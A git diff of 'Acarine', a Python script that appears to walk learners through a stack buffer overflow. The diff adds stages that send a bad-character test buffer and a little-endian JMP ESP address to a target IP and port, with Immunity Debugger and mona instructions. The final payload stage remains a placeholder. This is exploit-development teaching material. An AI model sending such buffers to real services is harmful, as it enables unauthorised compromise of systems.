@@ -1,6 +1,6 @@
 #!/bin/python
 
-# Acarine v0.4.4
+# Acarine v0.5.0
 
 # Usage: 
     # Acarine.py -t [IP] -p [PORT]
@@ -10,7 +10,6 @@
 # Dependencies:
     # Metasploit Framework Tools
 # Unfinished features in development:
-    # [4] Finding the Jump Point
     # [5] Final Buffer Overflow Exploit
 # Pending Fixes:
     # Error message to be added if incorrect args entered in terminal.
@@ -206,6 +205,15 @@ This means we are on target and now we will move on to the finding Bad Character
     
 # [3] Finding Bad Characters:
 
+def badCharsCall():
+    global badChars
+    badChars = r"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+    return badChars
+
+def badCharsExec(charInp):
+    charsPrompt(charInp)
+    charsConvert(badChars)
+
 def charsMod(charsResultInput):
     global badChars
     toRemove = charsResultInput.split(' ')
@@ -221,23 +229,25 @@ def charsPrompt(charsResultInput):
     else:
         charsMod(charsResultInput)
 
-def charsConvert(charsResultInput):
-    chars_chars_mod = badChars
+def charsConvert(charSend):
+    # if len(chars) ==  
+    chars_chars_mod = charSend
     arr = chars_chars_mod.split("\\x")
     arr = "".join(
         chr(int(i,16))
         for i in arr if i
         )
-    badCharsLoad = "A" * offset + "B" * 4 + arr
-    bufferSend(badCharsLoad)
-
-def badCharsExec(charInp):
-    charsPrompt(charInp)
-    charsConvert(badChars)
+    if len(charSend) != 16:
+        charsLoad = "A" * offset + "B" * 4 + arr
+    else:
+        charsLoad = "A" * offset + arr
+        # print(jmpEndian)
+    bufferSend(charsLoad)
 
 def badCharsTest():
-    global badChars
-    badChars = r"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+    # global badChars
+    # badChars = r"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+    badCharsCall()
     ## Instructions/Intro - Explains BadChars
     print(f"""\n{color.BOLD}{color.UNDERLINE}[3] Finding Bad Characters:{color.END}\n
 In this section we will be generating a series of characters that will use to diagnose whether the program
@@ -272,20 +282,85 @@ After making note of the bad character(s), make sure you {color.PURPLE}RE-LOAD a
         else:
             break
     print("\nNow that we have successfully discovered all the Bad Characters in the test program we will move onto Finding the Jump Point.\n")
+    print(badChars)
     jumpPointTest()
 
 # [4] Finding the Jump Point:
 
+def endianConvert():
+    jmpAdd = input(f"\n{color.GREEN}Please enter Jump Point Address: {color.END}")
+    menuCheck(jmpAdd)
+    if len(jmpAdd) != 10 or jmpAdd[1] != "x":
+        print(f"\n{color.RED}Wrong length/format entered!{color.END}")
+        endianConvert()
+    else:
+        global jmpEndian
+        global cutAdd
+        cutAdd = jmpAdd[2:10]
+        listAdd = []
+        lower = 6
+        upper = 8
+        for i in range(0,4):
+            listAdd.append(i)
+            listAdd[i] = cutAdd[lower:upper]
+            lower -= 2
+            upper -= 2
+            if lower == -2:
+                break
+        jmpEndian = r'\x' + r'\x'.join(listAdd)
+
 def jumpPointTest():
-    print("Jump Point Placeholder")
+    print(f"""\n{color.BOLD}{color.UNDERLINE}[4] Finding the Jump Point:{color.END}\n
+In this section we will be finding a jump point that allows us to point towards our eventual payload.""")
     offsetAvailble()
-    # print(badChars)
-    sys.exit()
+    print("\nTo find a jump point (with the program crashed or running) in Immunity enter either:")
+    print(rf'   [*] "{color.YELLOW}!mona find -s "\xff\xe4" -m {color.END}{color.RED}<program.exe>{color.END}", OR;')
+    print(rf'   [*] "{color.YELLOW}!mona find -s "\xff\xe4" -m {color.END}{color.CYAN}<DLL.dll>{color.END}" (If the program tested includes a {color.BOLD}DLL{color.END}).')
+    print(f"\nNB: If the results window doesn't show, on the top options bar: {color.BOLD}'Windows' -> 'Log Data'{color.END}\nNB: Multiple addresses may be returned, choose one.\n")
+    print(rf'The Jump Point address will appear in the format "{color.BOLD}0x080414c3{color.END}".')
+    endianConvert()
+    print(f"""\nThis address in Little Endian is {color.BOLD}{jmpEndian}{color.END}.\n
+We now need to test that we can use this jump point to our advantage.\n
+Make sure to now {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program.\n
+In {color.BOLD}Immunity{color.END}, at the top of the interface, there is a {color.BLUE}blue arrow pointing at four blue dots{color.END}, click on it.\n
+Now enter '{color.BOLD}{cutAdd}{color.END}' and click 'Okay'.\n
+Now press {color.BOLD}F2{color.END} and click 'Yes'""")
+    next = input(f"\n{color.GREEN}When ready to continue press [ENTER]: {color.END}")
+    menuCheck(next)
+    print(f"""\nIn the top left panel in Immunity you should see the following:\n
+> '{color.CYAN}{cutAdd}{color.END} ? FFE4 {color.RED}JMP{color.END} ESP'\n
+This sets our address as a {color.BOLD}Breakpoint{color.END}.""")
+    next = input(f"\n{color.GREEN}When ready to send test payload press [ENTER]: {color.END}")
+    menuCheck(next)
+    # jmpLoad = "A" * offset + jmpEndian
+    # bufferSend(jmpLoad)
+    # print()
+    charsConvert(jmpEndian)
+    print(f"""\nNow we should notice in the top left panel: 
+'{color.BOLD}EIP {color.CYAN}{cutAdd}{color.END}{color.BOLD} gatekeep.{cutAdd}{color.END}'
+\nAnd down in the top right we should see: 
+'{color.BOLD}Breakpoint at gatekeep.{cutAdd}'{color.END}\n
+This means we are hitting our jump point successfully.\n
+We will now be moving onto crafting our final payload.\n""")
+    exploitBuffer()
 
 # [5] Final Buffer Overflow Exploit:
 
+def badCharsAvailable():
+    try:
+        badChars
+    except NameError:
+        badCharsEnter()
+
+def badCharsEnter():
+    badCharsCall()
+    charsInput = input(f"{color.RED}\nNo bad characters detected from previous sections.{color.END}\n\n{color.GREEN}{color.GREEN}Enter bad characters seperated by spaces, OR press [ENTER] if target program has no bad characters: {color.END}")
+    charsMod(charsInput)
+
 def exploitBuffer():
     print("Exploit Placeholder")
+    offsetAvailble()
+    badCharsAvailable()
     sys.exit()
 
 # [!] Main:
